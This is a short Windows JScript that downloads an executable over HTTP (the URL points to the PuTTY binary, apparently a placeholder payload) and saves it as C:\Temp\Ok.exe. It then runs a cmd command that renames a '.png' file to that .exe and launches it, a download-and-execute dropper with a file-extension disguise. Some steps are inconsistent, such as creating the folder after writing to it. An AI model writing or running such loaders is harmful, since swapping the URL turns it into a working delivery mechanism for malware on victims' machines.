var WshShell = WScript.CreateObject("WScript.Shell");
var filepath = "C:\\Temp\\Ok.exe";
var url = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe";

var fso = new ActiveXObject("Scripting.FileSystemObject");
if (fso.FileExists(filepath) == false) {
    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    xhr.open("GET", url, false);
    xhr.send();

    var stream = new ActiveXObject("ADODB.Stream");
    stream.Open();
    stream.Type = 1;
    stream.Write(xhr.ResponseBody);
    stream.Position = 0;
    stream.SaveToFile(filepath, 2);
    stream.Close();
    WshShell.Run("cmd /c @echo off && mkdir \"c:\\Temp\" && ren \"c:\\Temp\\Fichier.png\" Ok.exe && START \"\" \"C:\\Temp\\Ok.exe\"");
}
else {
    WshShell.Run("cmd /c START \"\" \"C:\\Temp\\Ok.exe\"");
}
